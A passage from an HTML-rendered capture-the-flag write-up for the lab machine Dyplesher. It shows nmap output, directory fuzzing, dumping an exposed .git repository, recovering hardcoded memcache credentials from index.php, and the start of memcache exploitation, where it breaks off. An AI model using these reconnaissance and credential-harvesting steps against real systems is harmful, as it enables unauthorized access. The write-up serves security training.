</span></span><span class=line><span class=cl>SF:ntent=\&#34;text/html;\x20charset=UTF-8\&#34;\x20/&gt;\n\t&lt;meta\x20http-equiv=\&#34;X-
</span></span><span class=line><span class=cl>SF:UA-Compatible\&#34;\x20content=\&#34;IE=edge\&#34;/&gt;\n\t\n\t\t&lt;meta\x20name=\&#34;autho
</span></span><span class=line><span class=cl>SF:r\&#34;\x20content=\&#34;Gogs\&#34;\x20/&gt;\n\t\t&lt;meta\x20name=\&#34;description\&#34;\x20con
</span></span><span class=line><span class=cl>SF:tent=\&#34;Gogs\x20is\x20a\x20painless\x20self-hosted\x20Git\x20service\&#34;\x
</span></span><span class=line><span class=cl>SF:20/&gt;\n\t\t&lt;meta\x20name=\&#34;keywords\&#34;\x20content=\&#34;go,\x20git,\x20self-h
</span></span><span class=line><span class=cl>SF:osted,\x20gogs\&#34;&gt;\n\t\n\t&lt;meta\x20name=\&#34;referrer\&#34;\x20content=\&#34;no-ref
</span></span><span class=line><span class=cl>SF:errer\&#34;\x20/&gt;\n\t&lt;meta\x20name=\&#34;_csrf\&#34;\x20content=\&#34;BNN6xvu0OovfL_MK2
</span></span><span class=line><span class=cl>SF:WhcVoSl4PI6MTYwMDcxODgzMTUyNzM3NjE4MA==\&#34;\x20/&gt;\n\t&lt;meta\x20name=\&#34;_sub
</span></span><span class=line><span class=cl>SF:url\&#34;\x20content=\&#34;\&#34;\x20/&gt;\n\t\n\t\n\t\n\t\t&lt;meta&#34;);
</span></span><span class=line><span class=cl>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
</span></span><span class=line><span class=cl>SF-Port25565-TCP:V=7.80%I=7%D=9/21%Time=5F69068A%P=x86_64-unknown-linux-gn
</span></span><span class=line><span class=cl>SF:u%r(DNSVersionBindReqTCP,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;Unsupported\x20protocol\x
</span></span><span class=line><span class=cl>SF:20version\&#34;}&#34;)%r(DNSStatusRequestTCP,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;Unsupported\x
</span></span><span class=line><span class=cl>SF:20protocol\x20version\&#34;}&#34;)%r(SSLSessionReq,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;Unsuppo
</span></span><span class=line><span class=cl>SF:rted\x20protocol\x20version\&#34;}&#34;)%r(TLSSessionReq,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;U
</span></span><span class=line><span class=cl>SF:nsupported\x20protocol\x20version\&#34;}&#34;)%r(LPDString,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\
</span></span><span class=line><span class=cl>SF:&#34;Unsupported\x20protocol\x20version\&#34;}&#34;)%r(LDAPSearchReq,2A,&#34;\)\0&#39;{\&#34;te
</span></span><span class=line><span class=cl>SF:xt\&#34;:\&#34;Unsupported\x20protocol\x20version\&#34;}&#34;)%r(SIPOptions,2A,&#34;\)\0&#39;{\
</span></span><span class=line><span class=cl>SF:&#34;text\&#34;:\&#34;Unsupported\x20protocol\x20version\&#34;}&#34;)%r(NotesRPC,74,&#34;s\0q{\
</span></span><span class=line><span class=cl>SF:&#34;text\&#34;:\&#34;Unsupported\x20protocol\x20version\x200,\x20please\x20use\x20
</span></span><span class=line><span class=cl>SF:one\x20of\x20these\x20versions:\n1\.8\.x,\x201\.9\.x,\x201\.10\.x,\x201
</span></span><span class=line><span class=cl>SF:\.11\.x,\x201\.12\.x\&#34;}&#34;)%r(oracle-tns,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;Unsupported
</span></span><span class=line><span class=cl>SF:\x20protocol\x20version\&#34;}&#34;)%r(ms-sql-s,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;Unsupporte
</span></span><span class=line><span class=cl>SF:d\x20protocol\x20version\&#34;}&#34;)%r(afp,2A,&#34;\)\0&#39;{\&#34;text\&#34;:\&#34;Unsupported\x2
</span></span><span class=line><span class=cl>SF:0protocol\x20version\&#34;}&#34;);
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Mon Sep 21 22:03:31 2020 -- 1 IP address (1 host up) scanned in 293.75 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=http-discovery>HTTP discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h2><p>Browsing http://10.10.10.190/, we can read <code>Host: test.dyplesher.htb</code>.</p><p>So let&rsquo;s add the following entries to <code>/etc/hosts</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>10.10.10.190 dyplesher.htb
</span></span><span class=line><span class=cl>10.10.10.190 test.dyplesher.htb
</span></span></code></pre></td></tr></table></div></div><p>There is also a staff page (<a href=http://dyplesher.htb/staff>http://dyplesher.htb/staff</a>) that could help us if
we would need to bruteforce or guess a user account later.</p><p><a href=http://dyplesher.htb/staff>http://dyplesher.htb/staff</a></p><ul><li>MinatoTW, owner</li><li>felamos, dev</li><li>yuntao, admin</li></ul><p>Now if we try to reach the test sub-domain <a href=http://test.dyplesher.htb/>http://test.dyplesher.htb/</a>, there is
a form to store a key/value couple into memcache (port 11211).
Right now we don&rsquo;t know if it works so let&rsquo;s enumerate a bit.</p><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p>We can perform a sub-folder enumeration with <a href=https://github.com/ffuf/ffuf>ffuf</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>ffuf</span> <span class=o>-</span><span class=n>u</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>test</span><span class=o>.</span><span class=n>dyplesher</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span> <span class=o>-</span><span class=n>c</span> <span class=o>-</span><span class=n>w</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span> <span class=o>-</span><span class=n>fc</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>/</span><span class=s1>&#39;___\  /&#39;</span><span class=n>___</span>\           <span class=o>/</span><span class=s1>&#39;___</span><span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=s1>       /\ \__/ /\ \__/  __  __  /\ \__/</span>
</span></span><span class=line><span class=cl>       \ \ <span class=p>,</span><span class=n>__</span>\\ \ <span class=p>,</span><span class=n>__</span>\<span class=o>/</span>\ \<span class=o>/</span>\ \ \ \ <span class=p>,</span><span class=n>__</span>\
</span></span><span class=line><span class=cl>        \ \ \<span class=n>_</span><span class=o>/</span> \ \ \<span class=n>_</span><span class=o>/</span>\ \ \<span class=n>_</span>\ \ \ \ \<span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>         \ \<span class=n>_</span>\   \ \<span class=n>_</span>\  \ \<span class=n>____</span><span class=o>/</span>  \ \<span class=n>_</span>\
</span></span><span class=line><span class=cl>          \<span class=o>/</span><span class=n>_</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>   \<span class=o>/</span><span class=n>___</span><span class=o>/</span>    \<span class=o>/</span><span class=n>_</span><span class=o>/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       <span class=n>v1</span><span class=o>.</span><span class=mf>2.0</span><span class=o>-</span><span class=n>git</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Method</span>           <span class=p>:</span> <span class=n>GET</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>URL</span>              <span class=p>:</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>test</span><span class=o>.</span><span class=n>dyplesher</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>FUZZ</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Wordlist</span>         <span class=p>:</span> <span class=n>FUZZ</span><span class=p>:</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>SecLists</span><span class=o>/</span><span class=n>Discovery</span><span class=o>/</span><span class=n>Web</span><span class=o>-</span><span class=n>Content</span><span class=o>/</span><span class=n>raft</span><span class=o>-</span><span class=n>small</span><span class=o>-</span><span class=n>words</span><span class=o>-</span><span class=n>lowercase</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Follow</span> <span class=n>redirects</span> <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Calibration</span>      <span class=p>:</span> <span class=bp>false</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Timeout</span>          <span class=p>:</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Threads</span>          <span class=p>:</span> <span class=mi>40</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Matcher</span>          <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span><span class=mi>204</span><span class=p>,</span><span class=mi>301</span><span class=p>,</span><span class=mi>302</span><span class=p>,</span><span class=mi>307</span><span class=p>,</span><span class=mi>401</span><span class=p>,</span><span class=mi>403</span>
</span></span><span class=line><span class=cl> <span class=p>::</span> <span class=n>Filter</span>           <span class=p>:</span> <span class=n>Response</span> <span class=n>status</span><span class=p>:</span> <span class=mi>403</span>
</span></span><span class=line><span class=cl><span class=n>________________________________________________</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>.</span>                       <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>200</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>239</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>16</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>15</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>git</span>                    <span class=p>[</span><span class=n>Status</span><span class=p>:</span> <span class=mi>301</span><span class=p>,</span> <span class=n>Size</span><span class=p>:</span> <span class=mi>323</span><span class=p>,</span> <span class=n>Words</span><span class=p>:</span> <span class=mi>20</span><span class=p>,</span> <span class=n>Lines</span><span class=p>:</span> <span class=mi>10</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>::</span> <span class=n>Progress</span><span class=p>:</span> <span class=p>[</span><span class=mi>38267</span><span class=o>/</span><span class=mi>38267</span><span class=p>]</span> <span class=p>::</span> <span class=n>Job</span> <span class=p>[</span><span class=mi>1</span><span class=o>/</span><span class=mi>1</span><span class=p>]</span> <span class=p>::</span> <span class=mi>1843</span> <span class=n>req</span><span class=o>/</span><span class=n>sec</span> <span class=p>::</span> <span class=n>Duration</span><span class=p>:</span> <span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>00</span><span class=p>:</span><span class=mi>21</span><span class=p>]</span> <span class=p>::</span> <span class=n>Errors</span><span class=p>:</span> <span class=mi>0</span> <span class=p>::</span>
</span></span></code></pre></td></tr></table></div></div><p>There a git folder exposed, so let&rsquo;s dump it with <a href=https://github.com/internetwache/GitTools>gittools</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>gittools</span><span class=o>-</span><span class=n>gitdumper</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>test</span><span class=o>.</span><span class=n>dyplesher</span><span class=o>.</span><span class=n>htb</span><span class=o>/.</span><span class=n>git</span><span class=o>/</span> <span class=n>repo_dump</span>
</span></span><span class=line><span class=cl><span class=c1>###########</span>
</span></span><span class=line><span class=cl><span class=c1># GitDumper is part of https://github.com/internetwache/GitTools</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Developed and maintained by @gehaxelt from @internetwache</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Use at your own risk. Usage might be illegal in certain circumstances.</span>
</span></span><span class=line><span class=cl><span class=c1># Only for educational purposes!</span>
</span></span><span class=line><span class=cl><span class=c1>###########</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Destination</span> <span class=n>folder</span> <span class=n>does</span> <span class=ow>not</span> <span class=n>exist</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Creating</span> <span class=n>repo_dump</span><span class=o>/.</span><span class=n>git</span><span class=o>/</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=n>info</span><span class=o>/</span><span class=n>packs</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>description</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>config</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>COMMIT_EDITMSG</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>index</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>packed</span><span class=o>-</span><span class=n>refs</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>refs</span><span class=o>/</span><span class=n>remotes</span><span class=o>/</span><span class=n>origin</span><span class=o>/</span><span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>refs</span><span class=o>/</span><span class=n>stash</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>logs</span><span class=o>/</span><span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>logs</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>logs</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>remotes</span><span class=o>/</span><span class=n>origin</span><span class=o>/</span><span class=n>HEAD</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>info</span><span class=o>/</span><span class=n>refs</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>info</span><span class=o>/</span><span class=n>exclude</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>wip</span><span class=o>/</span><span class=n>index</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>wip</span><span class=o>/</span><span class=n>wtree</span><span class=o>/</span><span class=n>refs</span><span class=o>/</span><span class=n>heads</span><span class=o>/</span><span class=n>master</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=n>b1</span><span class=o>/</span><span class=n>fe9eddcdf073dc45bb406d47cde1704f222388</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>00</span><span class=o>/</span><span class=mi>00000000000000000000000000000000000000</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>3</span><span class=n>f</span><span class=o>/</span><span class=mf>91e452</span><span class=n>f3cbfa322a3fbd516c5643a6ebffc433</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=n>e6</span><span class=o>/</span><span class=mi>9</span><span class=n>de29bb2d1d6434b8b29ae775ad8c2e48c5391</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Downloaded</span><span class=p>:</span> <span class=n>objects</span><span class=o>/</span><span class=mi>27</span><span class=o>/</span><span class=mi>29</span><span class=n>b565f353181a03b2e2edb030a0e2b33d9af0</span>
</span></span></code></pre></td></tr></table></div></div><p>Not let&rsquo;s see what we have to learn from it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cd repo_dump
</span></span><span class=line><span class=cl>$ git status
</span></span><span class=line><span class=cl>On branch master
</span></span><span class=line><span class=cl>Your branch is based on &#39;origin/master&#39;, but the upstream is gone.
</span></span><span class=line><span class=cl>  (use &#34;git branch --unset-upstream&#34; to fixup)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Changes not staged for commit:
</span></span><span class=line><span class=cl>  (use &#34;git add/rm &lt;file&gt;...&#34; to update what will be committed)
</span></span><span class=line><span class=cl>  (use &#34;git restore &lt;file&gt;...&#34; to discard changes in working directory)
</span></span><span class=line><span class=cl>        deleted:    README.md
</span></span><span class=line><span class=cl>        deleted:    index.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>no changes added to commit (use &#34;git add&#34; and/or &#34;git commit -a&#34;)
</span></span><span class=line><span class=cl>$ git restore README.md index.php
</span></span></code></pre></td></tr></table></div></div><p><code>index.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>HTML</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>BODY</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>h1</span><span class=o>&gt;</span><span class=nx>Add</span> <span class=nx>key</span> <span class=k>and</span> <span class=nx>value</span> <span class=nx>to</span> <span class=nx>memcache</span><span class=o>&lt;</span><span class=nx>h1</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>FORM</span> <span class=nx>METHOD</span><span class=o>=</span><span class=s2>&#34;GET&#34;</span> <span class=nx>NAME</span><span class=o>=</span><span class=s2>&#34;test&#34;</span> <span class=nx>ACTION</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>INPUT</span> <span class=nx>TYPE</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nx>NAME</span><span class=o>=</span><span class=s2>&#34;add&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>INPUT</span> <span class=nx>TYPE</span><span class=o>=</span><span class=s2>&#34;text&#34;</span> <span class=nx>NAME</span><span class=o>=</span><span class=s2>&#34;val&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>INPUT</span> <span class=nx>TYPE</span><span class=o>=</span><span class=s2>&#34;submit&#34;</span> <span class=nx>VALUE</span><span class=o>=</span><span class=s2>&#34;Send&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>FORM</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>pre</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;add&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;val&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$m</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Memcached</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$m</span><span class=o>-&gt;</span><span class=na>setOption</span><span class=p>(</span><span class=nx>Memcached</span><span class=o>::</span><span class=na>OPT_BINARY_PROTOCOL</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$m</span><span class=o>-&gt;</span><span class=na>setSaslAuthData</span><span class=p>(</span><span class=s2>&#34;felamos&#34;</span><span class=p>,</span> <span class=s2>&#34;zxcvbnm&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$m</span><span class=o>-&gt;</span><span class=na>addServer</span><span class=p>(</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=mi>11211</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$m</span><span class=o>-&gt;</span><span class=na>add</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;add&#39;</span><span class=p>],</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;val&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Done!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;its equal&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;/pre&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;/BODY&gt;
</span></span></span><span class=line><span class=cl><span class=err>&lt;/HTML&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>So it seems the app was not a rabbit hole but really working.</p><p>Remember of <code>felamos</code>? It was displayed as a dev on the staff page.
So there is a good amount of chance that he re-used his password here: <code>zxcvbnm</code>.
Anyway what&rsquo;s 100% sure it&rsquo;s that those credentials will work on memcache
service.</p><h2 id=memcache-exploitation>memcache exploitation<a hidden class=anchor aria-hidden=true href=#memcache-exploitation>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/gemrc
</span></span><span class=line><span class=cl># Read about the gemrc format at http://guides.rubygems.org/command-reference/#gem-environment
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># --user-install is used to install to $HOME/.gem/ by default since we want to separate
</span></span><span class=line><span class=cl>#                pacman installed gems and gem installed gems
</span></span><span class=line><span class=cl>gem: --user-install
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ gem install dalli
</span></span><span class=line><span class=cl>Fetching dalli-2.7.10.gem
</span></span><span class=line><span class=cl>WARNING:  You don&#39;t have /home/cyfun/.gem/ruby/2.7.0/bin in your PATH,
</span></span><span class=line><span class=cl>          gem executables will not run.
</span></span><span class=line><span class=cl>Successfully installed dalli-2.7.10
</span></span><span class=line><span class=cl>Parsing documentation for dalli-2.7.10
</span></span><span class=line><span class=cl>Installing ri documentation for dalli-2.7.10
</span></span><span class=line><span class=cl>Done installing documentation for dalli after 0 seconds
</span></span><span class=line><span class=cl>1 gem installed
</span></span></code></pre></td></tr></table></div></div><p>Ref.: <a href=https://github.com/petergoldstein/dalli>Dalli</a></p><p>I wrote a quick script <code>memcache.rb</code> to connect to memcache and dump credentials.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
